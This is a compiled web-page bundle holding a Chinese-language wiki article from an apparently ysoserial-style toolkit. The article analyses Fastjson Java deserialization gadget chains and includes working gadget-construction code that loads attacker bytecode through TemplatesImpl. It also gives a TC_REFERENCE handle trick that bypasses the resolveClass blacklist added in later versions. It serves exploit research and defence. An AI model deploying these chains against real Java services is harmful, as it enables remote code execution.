"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[765],{51735:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>l,contentTitle:()=>r,default:()=>p,frontMatter:()=>i,metadata:()=>c,toc:()=>d});var t=n(85893),a=n(11151);const i={sidebar_position:1,tags:["ysoserial","PPPYSO","Fastjson"]},r="Fastjson",c={id:"PPPYSO/gadgets/Fastjson/Fastjson",title:"Fastjson",description:"0x00 fastjon \u89e6\u53d1 getter",source:"@site/docs/01-PPPYSO/01-gadgets/04-Fastjson/04-Fastjson.md",sourceDirName:"01-PPPYSO/01-gadgets/04-Fastjson",slug:"/PPPYSO/gadgets/Fastjson/",permalink:"/docs/PPPYSO/gadgets/Fastjson/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/01-PPPYSO/01-gadgets/04-Fastjson/04-Fastjson.md",tags:[{label:"ysoserial",permalink:"/docs/tags/ysoserial"},{label:"PPPYSO",permalink:"/docs/tags/pppyso"},{label:"Fastjson",permalink:"/docs/tags/fastjson"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["ysoserial","PPPYSO","Fastjson"]},sidebar:"tutorialSidebar",previous:{title:"ROME",permalink:"/docs/PPPYSO/gadgets/Rome/"},next:{title:"Jackson",permalink:"/docs/PPPYSO/gadgets/Jackson/"}},l={},d=[{value:"0x00 fastjon \u89e6\u53d1 getter",id:"0x00-fastjon-\u89e6\u53d1-getter",level:2},{value:"0x01 \u7ec4\u5408\u8c03\u7528\u94fe",id:"0x01-\u7ec4\u5408\u8c03\u7528\u94fe",level:2},{value:"0x02 \u8865\u5145 \u4e3a\u4ec0\u4e48\u4f1a\u89e6\u53d1 fastjson \u7684 getter",id:"0x02-\u8865\u5145-\u4e3a\u4ec0\u4e48\u4f1a\u89e6\u53d1-fastjson-\u7684-getter",level:2},{value:"getObjectWriter",id:"getobjectwriter",level:3},{value:"ListSerializer",id:"listserializer",level:3},{value:"0x03 1.2.49\u4e4b\u540e\u7684\u6539\u52a8",id:"0x03-1249\u4e4b\u540e\u7684\u6539\u52a8",level:2},{value:"resolveClass() \u5e94\u8be5\u8fd9\u4e48\u5199\u5417\uff1f",id:"resolveclass-\u5e94\u8be5\u8fd9\u4e48\u5199\u5417",level:3},{value:"handled \u5904\u7406\u673a\u5236",id:"handled-\u5904\u7406\u673a\u5236",level:3},{value:"0x04 fastjson2",id:"0x04-fastjson2",level:2}];function o(e){const s={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,a.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.h1,{id:"fastjson",children:"Fastjson"}),"\n",(0,t.jsx)(s.h2,{id:"0x00-fastjon-\u89e6\u53d1-getter",children:"0x00 fastjon \u89e6\u53d1 getter"}),"\n",(0,t.jsxs)(s.p,{children:["fastjson \u662f\u4e00\u5957\u5f00\u6e90\u89e3\u6790\u5e93\uff0c\u53ef\u4ee5\u628a Java \u5bf9\u8c61\u8f6c\u5316\u6210 JSON \u5f62\u5f0f\u6765\u8868\u793a\uff0c\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"JSON.parseObject()\u3001JSON.parse()"})," \u53cd\u5e8f\u5217\u5316 json \u5b57\u7b26\u4e32\uff0c\u5bf9 fastjson \u6f0f\u6d1e\u6bd4\u8f83\u719f\u6089\u7684\u8bdd\u5c31\u77e5\u9053\u53cd\u5e8f\u5217\u5316\u65f6\u53ef\u4ee5\u901a\u8fc7 @type \u6307\u5b9a\u7c7b\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"JSON.parse()"})," \u89e6\u53d1 setter \uff0c\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"JSON.parseObject()"})," \u89e6\u53d1 getter\u3001setter \u5b9e\u73b0\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002"]}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.code,{children:"JSON.toJSONString()"})," \u65b9\u6cd5\u5728\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\u4e3a json \u5b57\u7b26\u4e32\u65f6\uff0c\u4e5f\u540c\u6837\u4f1a\u89e6\u53d1 getter \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u5f88\u719f\u6089\u53ef\u4ee5\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"TemplatesImpl.getOutputProperties()"})," \u5b9e\u73b0\u5b57\u8282\u7801\u7684\u4efb\u610f\u52a0\u8f7d\u3002"]}),"\n",(0,t.jsx)(s.h2,{id:"0x01-\u7ec4\u5408\u8c03\u7528\u94fe",children:"0x01 \u7ec4\u5408\u8c03\u7528\u94fe"}),"\n",(0,t.jsxs)(s.p,{children:["\u5728 fastjson \u4e2d  ",(0,t.jsx)(s.code,{children:"JSONArray"})," \u548c ",(0,t.jsx)(s.code,{children:"JSONObject"})," \u5bf9\u62bd\u8c61\u7c7b JSON \u8fdb\u884c\u4e86\u5b9e\u73b0\uff0c\u5e76\u5b9e\u73b0\u4e86 ",(0,t.jsx)(s.code,{children:"Serializable"})," \u63a5\u53e3\uff0c\u4f46\u662f\u5f88\u53ef\u60dc\u5e76\u4e0d\u5b58\u5728 readObject() \u65b9\u6cd5\u4e0d\u80fd\u4f5c\u4e3a kick-off\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u8981\u7ee7\u7eed\u5bfb\u627e\u8c03\u7528\u4e86 ",(0,t.jsx)(s.code,{children:"toJSONString()"})," \u7684\u65b9\u6cd5\u3002\u800c\u5728 ",(0,t.jsx)(s.code,{children:"com.alibaba.fastjson.JSON"})," \u6b63\u597d\u6709\u4e00\u4e2a ",(0,t.jsx)(s.code,{children:"toString()"})," \u65b9\u6cd5\u8c03\u7528\u4e86 ",(0,t.jsx)(s.code,{children:"toJSONString()"})," \u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230811100802077",src:n(87233).Z+"",width:"1064",height:"190"})}),"\n",(0,t.jsxs)(s.p,{children:["\u63a5\u4e0b\u6765\u5bfb\u627e\u4e00\u4e2a ",(0,t.jsx)(s.code,{children:"toString()"})," \u65b9\u6cd5\u6765\u89e6\u53d1\u6700\u7ec8\u7684 getter \uff0c\u76f4\u63a5\u7528 ",(0,t.jsx)(s.code,{children:"BadAttributeValueExpException"})," \u7684 val \u5b57\u6bb5\u6765\u89e6\u53d1\uff0c\u6240\u4ee5\u6784\u9020\u51fa\u7684 gadget \u5982\u4e0b\uff1a"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-java",children:'public Object getObject(String command) throws Exception {\n    Object templatesImpl = Gadgets.createTemplatesImpl(command);\n    JSONArray jsonArray = new JSONArray();\n    jsonArray.add(templatesImpl);\n\n    BadAttributeValueExpException bd = new BadAttributeValueExpException(null);\n    Reflections.setFieldValue(bd, "val", jsonArray);\n    return bd;\n}\n'})}),"\n",(0,t.jsx)(s.h2,{id:"0x02-\u8865\u5145-\u4e3a\u4ec0\u4e48\u4f1a\u89e6\u53d1-fastjson-\u7684-getter",children:"0x02 \u8865\u5145 \u4e3a\u4ec0\u4e48\u4f1a\u89e6\u53d1 fastjson \u7684 getter"}),"\n",(0,t.jsxs)(s.p,{children:["\u6309\u7167\u524d\u9762 gadget \u6784\u5efa\u601d\u8def\uff0c\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53d1\u73b0\u65e0\u8bba\u5982\u4f55\u90fd\u65e0\u6cd5\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"toString()"})," \u6765\u89e6\u53d1 getter"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-java",children:'User user = new User("user", "pass", "msg");\n\nSystem.out.println("-- JSONObject.toJSONString() --");\nString json = JSON.toJSONString(user, SerializerFeature.WriteClassName);\nSystem.out.println(json);\nSystem.out.println("-- JSONObject.toJSON() --");\nJSON.toJSON(user);\nSystem.out.println("-- JSON.parse() --");\nJSON.parse(json);\nSystem.out.println("-- JSON.parseObject() --");\nObject obj = JSON.parseObject(json);\nSystem.out.println("-- JSONObject.toString() --");\nobj.toString();\n'})}),"\n",(0,t.jsxs)(s.p,{children:["\u8ddf\u8fdb\u540e\u53d1\u73b0\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"getObjectWriter()"})," \u83b7\u53d6\u5230\u7684\u662f\u4e00\u4e2a ",(0,t.jsx)(s.code,{children:"MapSerializer"})]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814095857676",src:n(71314).Z+"",width:"2210",height:"920"})}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.code,{children:"MapSerializer.write()"})," \u8fd9\u4e2a\u7684\u4f5c\u7528\u4e5f\u6bd4\u8f83\u7b80\u5355\uff0c",(0,t.jsx)(s.code,{children:"entrySet"})," \u5bf9 map \u8fdb\u884c\u904d\u5386\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5e76\u6ca1\u6709\u8c03\u7528 getter \u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814100854783",src:n(39422).Z+"",width:"1876",height:"894"})}),"\n",(0,t.jsx)(s.h3,{id:"getobjectwriter",children:"getObjectWriter"}),"\n",(0,t.jsxs)(s.p,{children:["\u800c\u8fd9\u4e2a\u95ee\u9898\u5462\u662f\u56e0\u4e3a\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"getObjectWriter()"})," \u83b7\u53d6\u7684 ",(0,t.jsx)(s.code,{children:"ObjectSerializer"})," \u7c7b\u578b\u4e0d\u4e00\u6837\uff0c\u8fd4\u56de\u53bb\u770b\u4e00\u4e0b\u8fd9\u4e2a\u65b9\u6cd5\u7684\u6267\u884c\u903b\u8f91\u3002"]}),"\n",(0,t.jsx)(s.p,{children:"\u5728\u8fdb\u5165\u65b9\u6cd5\u540e\u9996\u5148\u4ece serializers \u4e2d\u53d6\u662f\u5426\u6709\u5b58\u5728 clazz \u7684\u9ed8\u8ba4\u6620\u5c04\uff0cserializers \u5728 SerializeConfig \u6784\u9020\u65b9\u6cd5\u65f6\u521d\u59cb\u5316\u5982\u4e0b\u3002"}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814102552316",src:n(36012).Z+"",width:"1802",height:"694"})}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-java",children:"put(Boolean.class, BooleanCodec.instance);\nput(Character.class, CharacterCodec.instance);\nput(Byte.class, IntegerCodec.instance);\nput(Short.class, IntegerCodec.instance);\nput(Integer.class, IntegerCodec.instance);\nput(Long.class, LongCodec.instance);\nput(Float.class, FloatCodec.instance);\nput(Double.class, DoubleSerializer.instance);\nput(BigDecimal.class, BigDecimalCodec.instance);\nput(BigInteger.class, BigIntegerCodec.instance);\nput(String.class, StringCodec.instance);\nput(byte[].class, PrimitiveArraySerializer.instance);\nput(short[].class, PrimitiveArraySerializer.instance);\nput(int[].class, PrimitiveArraySerializer.instance);\nput(long[].class, PrimitiveArraySerializer.instance);\nput(float[].class, PrimitiveArraySerializer.instance);\nput(double[].class, PrimitiveArraySerializer.instance);\nput(boolean[].class, PrimitiveArraySerializer.instance);\nput(char[].class, PrimitiveArraySerializer.instance);\nput(Object[].class, ObjectArrayCodec.instance);\nput(Class.class, MiscCodec.instance);\n\nput(SimpleDateFormat.class, MiscCodec.instance);\nput(Currency.class, new MiscCodec());\nput(TimeZone.class, MiscCodec.instance);\nput(InetAddress.class, MiscCodec.instance);\nput(Inet4Address.class, MiscCodec.instance);\nput(Inet6Address.class, MiscCodec.instance);\nput(InetSocketAddress.class, MiscCodec.instance);\nput(File.class, MiscCodec.instance);\nput(Appendable.class, AppendableSerializer.instance);\nput(StringBuffer.class, AppendableSerializer.instance);\nput(StringBuilder.class, AppendableSerializer.instance);\nput(Charset.class, ToStringSerializer.instance);\nput(Pattern.class, ToStringSerializer.instance);\nput(Locale.class, ToStringSerializer.instance);\nput(URI.class, ToStringSerializer.instance);\nput(URL.class, ToStringSerializer.instance);\nput(UUID.class, ToStringSerializer.instance);\n\n// atomic\nput(AtomicBoolean.class, AtomicCodec.instance);\nput(AtomicInteger.class, AtomicCodec.instance);\nput(AtomicLong.class, AtomicCodec.instance);\nput(AtomicReference.class, ReferenceCodec.instance);\nput(AtomicIntegerArray.class, AtomicCodec.instance);\nput(AtomicLongArray.class, AtomicCodec.instance);\n\nput(WeakReference.class, ReferenceCodec.instance);\nput(SoftReference.class, ReferenceCodec.instance);\n"})}),"\n",(0,t.jsx)(s.p,{children:"\u5728 writer \u83b7\u53d6\u4e3a\u7a7a\u65f6\uff0c\u5c06\u6839\u636e clazz \u7684\u7c7b\u578b\u6784\u5efa\u76f8\u5e94\u7684 ObjectSerializer \u5bf9\u8c61\uff0c\u5230\u9053\u7406\u95ee\u9898\u7684\u89e3\u51b3\u601d\u8def\u5c31\u5f88\u660e\u786e\u4e86\uff1a"}),"\n",(0,t.jsxs)(s.ol,{children:["\n",(0,t.jsx)(s.li,{children:"\u9009\u53d6\u4e00\u4e2a\u80fd\u89e6\u53d1\u5230 getter \u7684 ObjectSerializer"}),"\n",(0,t.jsx)(s.li,{children:"\u6309\u7167\u5e8f\u5217\u5316\u7684\u89c4\u5219\u6784\u9020\u4e00\u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u5e8f\u5217\u5316\u5bf9\u8c61"}),"\n"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814103203322",src:n(94563).Z+"",width:"2056",height:"1686"})}),"\n",(0,t.jsx)(s.h3,{id:"listserializer",children:"ListSerializer"}),"\n",(0,t.jsx)(s.p,{children:"\u6839\u636e\u4e0a\u6587\u7684\u601d\u8def\uff0c\u6211\u4eec\u901a\u8fc7 ArrayList \u5c01\u88c5\u540e\u5c31\u80fd\u8fdb\u5165 ListSerializer \u903b\u8f91\u4e86\u3002"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-java",children:'User user = new User("user", "pass", "msg");\nSystem.out.println("++ JSONArray ++");\nArrayList arrayList = new ArrayList();\narrayList.add(user);\nSystem.out.println("-- JSONArray.toJSONString() --");\nString json2 = JSONArray.toJSONString(arrayList, SerializerFeature.WriteClassName);\nSystem.out.println(json2);\nSystem.out.println("-- JSON.parseObject() --");\nObject obj = JSON.parse(json2);\nSystem.out.println("-- toString --");\nobj.toString();\n'})}),"\n",(0,t.jsxs)(s.p,{children:["\u5b9a\u4f4d\u5230\u6b64\u5904\u5bf9\u7c7b\u7684\u5c5e\u6027\u8fdb\u884c\u63d0\u53d6\uff0c\u4e4b\u540e\u7684\u6d41\u7a0b\u5c31\u662f ASMDeserializer \u7684\u76f8\u5173\u65b9\u6cd5\uff0c\u5173\u4e8e ASMDeserializer \u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003 ",(0,t.jsx)(s.a,{href:"https://xie.infoq.cn/article/dcb61126e58c23ff2cf4731c1",children:"Fastjson \u8e29\u201c\u5751\u201d\u8bb0\u5f55\u548c\u201c\u6df1\u5ea6\u201d\u5b66\u4e60"})," \uff0c\u8fd9\u91cc\u4e0d\u6df1\u5165\u5c55\u5f00\uff0c\u4ec5\u662f\u5bf9\u4e3a\u4ec0\u4e48\u7528\u5230 JSONArray \u7684\u4e00\u4e2a\u8865\u5145\u5206\u6790\u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814111438754",src:n(66727).Z+"",width:"2060",height:"858"})}),"\n",(0,t.jsx)(s.h2,{id:"0x03-1249\u4e4b\u540e\u7684\u6539\u52a8",children:"0x03 1.2.49\u4e4b\u540e\u7684\u6539\u52a8"}),"\n",(0,t.jsxs)(s.p,{children:["\u5728 1.2.49 \u8fd9\u4e2a\u7248\u672c\u540e JSONArray \u548c JSONObject \u90fd\u5b9e\u73b0\u4e86\u81ea\u5df1\u7684 readObject() \u65b9\u6cd5\uff0c\u5c06\u53cd\u5e8f\u5217\u5316\u59d4\u6258\u7ed9 ",(0,t.jsx)(s.code,{children:"SecureObjectInputStream"})," \u7c7b\uff0c\u901a\u8fc7\u5176\u91cd\u5199\u7684 ",(0,t.jsx)(s.code,{children:"resolveClass()"})," \u65b9\u6cd5\u8c03\u7528 ",(0,t.jsx)(s.code,{children:"checkAutoType()"})," \u5b9e\u73b0\u9ed1\u540d\u5355\u68c0\u67e5\u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814114353926",src:n(83858).Z+"",width:"1810",height:"556"})}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814114656867",src:n(45378).Z+"",width:"1876",height:"828"})}),"\n",(0,t.jsx)(s.h3,{id:"resolveclass-\u5e94\u8be5\u8fd9\u4e48\u5199\u5417",children:"resolveClass() \u5e94\u8be5\u8fd9\u4e48\u5199\u5417\uff1f"}),"\n",(0,t.jsxs)(s.p,{children:["\u6211\u4eec\u518d\u6765\u4ed4\u7ec6\u770b\u4e00\u4e0b fastjson \u7684\u5904\u7406\u65b9\u5f0f\uff0c\u662f\u5148\u8c03\u7528\u4e86 ",(0,t.jsx)(s.code,{children:"JSONObject"})," \u7684\n",(0,t.jsx)(s.code,{children:"readObject()"})," \u540e\uff0c\u518d\u5c06 ObjectInputStream \u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 ",(0,t.jsx)(s.code,{children:"SecureObjectInputStream"})," \u5224\u65ad\u662f\u5426\u4e3a\u9ed1\u540d\u5355\uff0c\u4e4b\u540e\u8fd8\u662f\u8fd4\u56de\u5230 ",(0,t.jsx)(s.code,{children:"JSONObject"})," \u7684 ",(0,t.jsx)(s.code,{children:"readObject()"})," \u65b9\u6cd5\u4e2d\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"secIn.defaultReadObject();"})," \u5b9e\u73b0\u6574\u4e00\u4e2a\u7684\u53cd\u5e8f\u5217\u5316\u3002"]}),"\n",(0,t.jsx)(s.p,{children:"\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u5c06\u5904\u7406\u903b\u8f91\u62bd\u8c61\u4e3a"}),"\n",(0,t.jsxs)(s.ol,{children:["\n",(0,t.jsx)(s.li,{children:"\u5df2\u7ecf\u901a\u8fc7\u9ed8\u8ba4 ObjectInputStream \u8c03\u7528\u8fc7 readObject()"}),"\n",(0,t.jsx)(s.li,{children:"\u901a\u8fc7\u4e00\u4e2a\u7c7b if \u6761\u4ef6\u5224\u65ad\uff0c\u53ea\u4e0d\u8fc7\u662f\u901a\u8fc7 resolveClass \u65b9\u6cd5"}),"\n"]}),"\n",(0,t.jsx)(s.p,{children:"\u6240\u4ee5\u6709\u4e00\u4e2a\u8fde\u8d2f\u7684\u601d\u7ef4\u65b9\u5f0f\uff0c\u662f\u5426\u6709\u529e\u6cd5\u7ed5\u8fc7 resolveClass ? \u7b2c\u4e00\u6b65\u5df2\u7ecf\u6267\u884c\u8fc7\u53cd\u5e8f\u5217\u5316\u4e86\uff0c\u5373\u8c03\u7528\u4e86 resolveClass() \u5904\u7406\u8fc7\u8be5\u5bf9\u8c61\uff0c\u4e4b\u540e\u6709\u529e\u6cd5\u5ffd\u7565\u5417\uff1f\u5f15\u7528\u7b2c\u4e00\u4e2a\uff1f"}),"\n",(0,t.jsx)(s.p,{children:"\u800c Y4tacker \u5e08\u5085\u5728\u7b2c\u4e8c\u7bc7 fastjson \u539f\u751f\u53cd\u5e8f\u5217\u5316\u7684\u5206\u6790\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u4e86\u4e00\u79cd\u65b9\u5f0f\uff0c\u8865\u9f50\u4e86\u4e4b\u524d\u6ca1\u80fd\u89e3\u51b3\u7684\u601d\u8003\u3002"}),"\n",(0,t.jsx)(s.h3,{id:"handled-\u5904\u7406\u673a\u5236",children:"handled \u5904\u7406\u673a\u5236"}),"\n",(0,t.jsxs)(s.p,{children:["\u5728 ",(0,t.jsx)(s.code,{children:"java.io.ObjectInputStream.readObject0()"})," \u65b9\u6cd5\u4e2d\u4f1a\u6839\u636e\u5b57\u8282\u6570\u636e\u7684\u7c7b\u578b\u6267\u884c\u4e0d\u540c\u7684\u5904\u7406\uff0c\u5b58\u5728\u4e00\u4e9b\u7c7b\u578b\u4e0d\u4f1a\u6267\u884c ",(0,t.jsx)(s.code,{children:"resolveClass"})," \u68c0\u67e5\u7684\u5206\u652f\u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814115559510",src:n(56740).Z+"",width:"1838",height:"908"})}),"\n",(0,t.jsxs)(s.p,{children:["\u6bd4\u5982\u8fd9\u91cc\u9762\u7684 ",(0,t.jsx)(s.code,{children:"TC_NULL"}),"\u3001",(0,t.jsx)(s.code,{children:"TC_REFERENCE"}),"\u3001",(0,t.jsx)(s.code,{children:"TC_STRING"}),"\u3001",(0,t.jsx)(s.code,{children:"TC_LONGSTRING"}),"\u3001",(0,t.jsx)(s.code,{children:"TC_EXCEPTION"}),"\uff0c\u6211\u4eec\u9009\u62e9 ",(0,t.jsx)(s.code,{children:"TC_REFERENCE"})," \u5f15\u7528\u7c7b\u578b\uff0c\u8fdb\u5165 ",(0,t.jsx)(s.code,{children:"readHandle()"})," \u65b9\u6cd5\uff0c\u770b\u5230\u4ece handles \u8868\u4e2d\u83b7\u53d6\u5f15\u7528\u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814134415325",src:n(22727).Z+"",width:"1888",height:"1126"})}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.code,{children:"handles"})," \u662f\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5\uff0c\u4e0e\u5bf9\u8c61\u5f15\u7528\u548c\u5171\u4eab\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u6709\u5173\uff0c\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u5e8f\u5217\u5316\u3001\u53cd\u5e8f\u5217\u5316\u76f8\u540c\u7684\u5bf9\u8c61\u800c\u5f15\u5165\u8be5\u673a\u5236\u3002\u5f53\u53cd\u5e8f\u5217\u5316\u65f6\u9047\u5230\u4e00\u4e2a\u5bf9\u8c61\u5f15\u7528\u65f6\uff08 ",(0,t.jsx)(s.code,{children:"TC_REFERENCE"})," \u6807\u8bb0\uff09\uff0c\u5b83\u4f1a\u67e5\u627e ",(0,t.jsx)(s.code,{children:"handles"})," \u8868\uff0c\u770b\u662f\u5426\u5df2\u7ecf\u53cd\u5e8f\u5217\u5316\u4e86\u76f8\u540c\u7684\u5bf9\u8c61\u3002"]}),"\n",(0,t.jsxs)(s.p,{children:["\u5728 Y4tacker \u5e08\u5085\u7684\u5206\u6790\u4e2d\u8bf4 ",(0,t.jsx)(s.code,{children:"java.util.ArrayList"})," \uff08\u5176\u4ed6\u7684\u96c6\u5408 Map\u3001Set \u540c\u6837\u9002\u7528\uff09\u5728\u6267\u884c ",(0,t.jsx)(s.code,{children:"writeObject()"})," \u65f6\u6700\u7ec8\u4f1a\u5728 ",(0,t.jsx)(s.code,{children:"java.io.ObjectOutputStream.writeObject0()"})," \u65b9\u6cd5\u5411 handles \u4e2d\u5199\u5165\u5bf9\u8c61\uff0c\u7684\u786e handles \u673a\u5236\u4e5f\u7528\u5728\u5e8f\u5217\u5316\uff0c\u4f46\u53cd\u5e8f\u5217\u5316\u65f6\u4e0e ",(0,t.jsx)(s.code,{children:"ObjectOutputStream"})," \u65e0\u5173\uff0c\u8fd8\u9700\u8981\u7ee7\u7eed\u5206\u6790\u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20230814134514262",src:n(24046).Z+"",width:"1794",height:"1006"})}),"\n",(0,t.jsxs)(s.p,{children:["\u53cd\u5e8f\u5217\u5316\u4e00\u4e2a HashMap \u5bf9\u8c61\u5148\u6765\u770b\u4e00\u4e0b ",(0,t.jsx)(s.code,{children:"readObject0()"})," \u7684\u5904\u7406\uff0c\u7b2c\u4e00\u6b65\u4f1a\u5148\u5411 handles \u4e2d\u52a0\u5165\u7c7b\u7ed3\u6784\u7684\u63cf\u8ff0\u4fe1\u606f"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20240112113857887",src:n(7300).Z+"",width:"2216",height:"730"})}),"\n",(0,t.jsxs)(s.p,{children:["\u4e4b\u540e\u8fdb\u5165 ",(0,t.jsx)(s.code,{children:"readOrdinaryObject()"})," \u65b9\u6cd5\u5904\u7406\u4e00\u822c\u5bf9\u8c61"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20240112113943704",src:n(36153).Z+"",width:"1486",height:"158"})}),"\n",(0,t.jsxs)(s.p,{children:["\u9996\u5148\u901a\u8fc7 ",(0,t.jsx)(s.code,{children:"readClassDesc()"})," \u65b9\u6cd5\u8bfb\u53d6\u7c7b\u63cf\u8ff0\u4fe1\u606f\uff0c\u518d\u6839\u636e\u7c7b\u63cf\u8ff0\u4fe1\u606f\u521b\u5efa\u5bf9\u8c61\uff0cunshared \u4e3a fasle \u5219\u5171\u4eab\u5bf9\u8c61\u5f15\u7528\u3002\u800c HashMap \u7684 ",(0,t.jsx)(s.code,{children:"K key = (K) s.readObject();"})," \u9ed8\u8ba4\u5c31\u4f1a\u5c06\u8be5\u503c\u8bbe\u4e3a false\u3002\u8fd9\u4e5f\u662f\u89e3\u91ca\u4e3a\u4ec0\u4e48\u6211\u4eec\u8981\u628a\u9700\u8981\u5f15\u7528\u7684 TemplatesImpl \u5bf9\u8c61\u653e\u5230 key\u3002"]}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"image-20240112114108377",src:n(92193).Z+"",width:"2350",height:"1116"})}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-java",children:'public Object getObject(String command) throws Exception {\n    Object templatesImpl = Gadgets.createTemplatesImpl(command);\n\n    JSONArray jsonArray = new JSONArray();\n    jsonArray.add(templatesImpl);\n\n    BadAttributeValueExpException bd = new BadAttributeValueExpException(null);\n    Reflections.setFieldValue(bd, "val", jsonArray);\n\n    HashMap hashMap = new HashMap();\n    hashMap.put(templatesImpl, bd);\n    return hashMap;\n}\n'})}),"\n",(0,t.jsx)(s.h2,{id:"0x04-fastjson2",children:"0x04 fastjson2"}),"\n",(0,t.jsx)(s.p,{children:"fastjson2 \u7684\u6784\u9020\u7c7b\u4f3c"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-java",children:'public Object getObject(String command) throws Exception {\n    Object templatesImpl = Gadgets.createTemplatesImpl(command);\n    JSONArray jsonArray = new JSONArray();\n    jsonArray.add(templatesImpl);\n    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n    Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);\n    // M1\n    HashMap hashMap = new HashMap();\n    hashMap.put(templatesImpl, badAttributeValueExpException);\n    return hashMap;\n}\n'})}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.strong,{children:"\u53c2\u8003"})}),"\n",(0,t.jsxs)(s.blockquote,{children:["\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.a,{href:"https://paper.seebug.org/2055/",children:"https://paper.seebug.org/2055/"})}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.a,{href:"https://paper.seebug.org/2067/",children:"https://paper.seebug.org/2067/"})}),"\n"]})]})}function p(e={}){const{wrapper:s}={...(0,a.a)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},87233:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230811100802077-a5e9fce606ef536bdd23db068b36aa03.png"},71314:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814095857676-588ffb4436c2af2d7bc75cc16de21d38.png"},39422:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814100854783-8642d444eb15bede902ab90286214da6.png"},36012:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814102552316-f9aad950dea2915c6e5f61601fa8dd41.png"},94563:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814103203322-ece5c6442c32175085e449e7f158ddd7.png"},66727:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814111438754-5376dbd1de5009ebe92d342016e15e89.png"},83858:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814114353926-9ae66ee3396570e75946219920a3133c.png"},45378:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814114656867-58bc3b22b63294f92f9abcd1d446603f.png"},56740:(e,s,n)=>{n.d(s,{Z:()=>t});const t=n.p+"assets/images/image-20230814115559510-ad239d683b9ee9eba5f44f034caf1d86.png"},22727:(e,s,n)=>{n.d(s,{Z:()=>t});const 